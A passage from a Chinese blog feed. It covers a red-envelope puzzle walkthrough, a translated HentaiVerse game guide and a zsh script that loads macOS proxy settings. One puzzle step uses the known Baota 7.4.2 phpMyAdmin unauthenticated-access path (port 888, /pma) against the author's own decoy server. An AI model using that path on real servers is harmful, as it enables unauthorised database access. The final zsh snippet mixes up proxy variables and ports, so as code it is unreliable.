(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span 